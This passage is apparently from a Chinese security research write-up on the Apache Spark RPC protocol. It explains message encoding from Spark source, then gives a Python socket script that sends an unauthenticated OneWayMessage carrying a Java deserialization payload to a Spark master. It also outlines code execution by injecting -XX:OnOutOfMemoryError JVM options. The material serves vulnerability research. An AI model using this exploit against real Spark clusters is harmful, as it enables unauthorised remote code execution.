      public void encode(ChannelHandlerContext ctx, Message in, List out) throws Exception {
        Message.Type msgType = in.type();
        // All messages have the frame length, message type, and message itself. The frame length
        // may optionally include the length of the body data, depending on what message is being
        // sent.
        int headerLength = 8 + msgType.encodedLength() + in.encodedLength();
        long frameLength = headerLength + (isBodyInFrame ? bodyLength : 0);
        ByteBuf header = ctx.alloc().buffer(headerLength);
        header.writeLong(frameLength);
        msgType.encode(header);
        in.encode(header);
        assert header.writableBytes() == 0;
        if (body != null) {
          // We transfer ownership of the reference on in.body() to MessageWithHeader.
          // This reference will be freed when MessageWithHeader.deallocate() is called.
          out.add(new MessageWithHeader(in.body(), header, body, bodyLength));
        } else {
          out.add(header);
        }
      }
不同信息类型会重载encode 函数 msgType.encode 。
  * 其中 `OneWayMessage` 包括 4 字节的 body 长度
  * `RpcRequest` 包括 8 字节的 `requestId` 和 4 字节的 body 长度
  * `UploadStream` 包括 8 字节的 `requestId` ，4 字节 metaBuf.remaining, 1 字节 `metaBuf`, 8 字节的 `bodyByteCount`
    OneWayMessage.java
      public void encode(ByteBuf buf) {
        // See comment in encodedLength().
        buf.writeInt((int) body().size());
      }
    RpcRequest.java
      @Override
      public void encode(ByteBuf buf) {
        buf.writeLong(requestId);
        // See comment in encodedLength().
        buf.writeInt((int) body().size());
      }
    UploadStream.java 
    public void encode(ByteBuf buf) {
        buf.writeLong(requestId);
        try {
          ByteBuffer metaBuf = meta.nioByteBuffer();
          buf.writeInt(metaBuf.remaining());
          buf.writeBytes(metaBuf);
        } catch (IOException io) {
          throw new RuntimeException(io);
        }
        buf.writeLong(bodyByteCount);
message 枚举类型
    Message.java 
    public static Type decode(ByteBuf buf) {
          byte id = buf.readByte();
          switch (id) {
            case 0: return ChunkFetchRequest;
            case 1: return ChunkFetchSuccess;
            case 2: return ChunkFetchFailure;
            case 3: return RpcRequest;
            case 4: return RpcResponse;
            case 5: return RpcFailure;
            case 6: return StreamRequest;
            case 7: return StreamResponse;
            case 8: return StreamFailure;
            case 9: return OneWayMessage;
            case 10: return UploadStream;
            case -1: throw new IllegalArgumentException("User type messages cannot be decoded.");
            default: throw new IllegalArgumentException("Unknown message type: " + id);
          }
        }
nettyRpcHandler 处理消息`body`时,`body` 由通信双方地址和端口组成，后续是java序列化后的内容(ac ed 00 05)
其中 NettyRpcEnv.scala
[core/src/main/scala/org/apache/spark/rpc/netty/NettyRpcEnv.scala](https://github.com/apache/spark/blob/485145326a9c97ede260b0e267ee116f182cfd56/core/src/main/scala/org/apache/spark/rpc/netty/NettyRpcEnv.scala)
RequestMessage 类 `serialize` 方法是 RequestMessage 请求构建部分
    private[netty] class RequestMessage(
        val senderAddress: RpcAddress,
        val receiver: NettyRpcEndpointRef,
        val content: Any) {
      /** Manually serialize [[RequestMessage]] to minimize the size. */
      def serialize(nettyEnv: NettyRpcEnv): ByteBuffer = {
        val bos = new ByteBufferOutputStream()
        val out = new DataOutputStream(bos)
        try {
          writeRpcAddress(out, senderAddress)
          writeRpcAddress(out, receiver.address)
          out.writeUTF(receiver.name)
          val s = nettyEnv.serializeStream(out)
          try {
            s.writeObject(content)
          } finally {
            s.close()
          }
        } finally {
          out.close()
        }
        bos.toByteBuffer
      }
      private def writeRpcAddress(out: DataOutputStream, rpcAddress: RpcAddress): Unit = {
        if (rpcAddress == null) {
          out.writeBoolean(false)
        } else {
          out.writeBoolean(true)
          out.writeUTF(rpcAddress.host)
          out.writeInt(rpcAddress.port)
        }
      }
以 OneWayMessage 举例
构造payload
    def build_oneway_msg(payload):
        msg_type = b'\x09'
        other_msg = '''
        01 00 0f 31 39 32 2e 31 36 38 2e 31 30 31
    2e 31 32 39 00 00 89 6f 01 00 06 75 62 75 6e 74
    75 00 00 1b a5 00 06 4d 61 73 74 65 72
        '''
        other_msg = other_msg.replace('\n', "").replace(' ', "")
        body_msg = bytes.fromhex(other_msg) + payload
        msg = struct.pack('>Q',len(body_msg) + 21) + msg_type 
        msg += struct.pack('>I',len(body_msg))
        msg += body_msg
        return msg
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(100)
    server_address = ('192.168.101.129', 7077)
    sock.connect(server_address)
    # get ser_payload  构造java 反序列化payload 
    payload = build_oneway_msg(ser_payload)
    sock.send(payload)
    time.sleep(5)
    # data = sock.recv(1024)
    sock.close()
使用URLDNS 反序列化payload测试结果如上
###  0x02 exp 构建
`OneWayMessage` 可以绕过验证，理论上构造一个提交任务请求就行。尝试通过捕获 `rpcrequest` 请求并重放。
SPARK deploy 模式为 `cluster` 和 `client`。`client` 模式下提交任务方即为 `driver`, 需要和
`executor` 进行大量交互，尝试使用 `--deploy-mode cluster`
    ./bin/spark-submit --class org.apache.spark.examples.SparkPi  --master spark://192.168.101.129:7077   --deploy-mode cluster  --executor-memory 1G --total-executor-cores 2   examples/jars/spark-examples_2.11-2.4.5.jar  10
重放反序列化数据，报错
    org.apache.spark.SparkException: Unsupported message OneWayMessage(192.168.101.129:35183,RequestSubmitDriver(DriverDescription (org.apache.spark.deploy.worker.DriverWrapper))) from 192.168.101.129:35183
`NettyRpcHandler` 处理的反序列化数据为 `DeployMessage`
类型，`DeployMessage`消息类型有多个子类。当提交部署模式为`cluster`时，使用 `RequestSubmitDriver` 类;
部署方式为 `client`（默认）时，使用 `registerapplication` 类。
对不同消息处理逻辑在 master.scala 中，可以看到 receive
方法中不存在`RequestSubmitDriver`的处理逻辑，`OneWayMessage`特点就是单向信息不会回复，不会调用
`receiveAndreply` 方法。
      override def receive: PartialFunction[Any, Unit] = {
        ...
        case RegisterWorker(
        case RegisterApplication(description, driver) 
        case ExecutorStateChanged(
        case DriverStateChanged(
        ...
      }
      override def receiveAndReply(context: RpcCallContext): PartialFunction[Any, Unit] = {
            ...
            case RequestSubmitDriver(description) 
            ...
      }
在 [DEF CON Safe Mode – ayoul3 – Only Takes a Spark Popping a Shell on 1000
Nodes](https://www.youtube.com/watch?v=EAzdGo-i8vE)一文中，作者通过传递java 配置选项进行了代码执行。
    java 配置参数 -XX:OnOutOfMemoryError=touch /tmp/testspark 在JVM 发生内存错误时，会执行后续的命令
    通过使用 -Xmx:1m 限制内存为 1m 促使错误发生
提交任务携带以下配置选项
    spark.executor.extraJavaOptions=\"-Xmx:1m -XX:OnOutOfMemoryError=touch /tmp/testspark\"
SPARK-submit 客户端限制只能通过 `spark.executor.memory` 设定 内存值，报错
    Exception in thread "main" java.lang.IllegalArgumentException: Executor memory 1048576 must be at least 471859200. Please increase executor memory using the --executor-memory option or spark.executor.memory in Spark configuration.
最后通过使用 `SerializationDumper` 转储和重建为 `javaOpts` 的
`scala.collection.mutable.ArraySeq`, 并添加 `jvm` 参数 `-Xmx:1m`，注意
`SerializationDumper` 还需要做数组自增，和部分handler 的调整
## 0x05 参考连接
  1. [DEF CON Safe Mode – ayoul3 – Only Takes a Spark Popping a Shell on 1000 Nodes](https://www.youtube.com/watch?v=EAzdGo-i8vE)
  2. [Apache Spark RPC协议中的反序列化漏洞分析](https://www.freebuf.com/vuls/194532.html)
  3. [Spark Rpc 消息处理](https://zhmin.github.io/2019/07/29/spark-rpc-protocol/)
  4. [Spark源码阅读(四)：RPC之Transport传输层](https://masterwangzx.com/2020/09/02/RpcTransport/#bootstrap)
  5. [Spark 底层网络模块](http://sharkdtu.com/posts/spark-network.html)
  6. [spark 源码分析之十二—Spark RPC剖析之Spark RPC总结](https://www.cnblogs.com/johnny666888/p/11160486.html)
  7. [spark2.1.0之源码分析——RPC服务端引导程序TransportServerBootstrap](https://qdmana.com/2020/11/20201112220618627e.html)
  8. [spark 官方文档](https://spark.apache.org/security.html)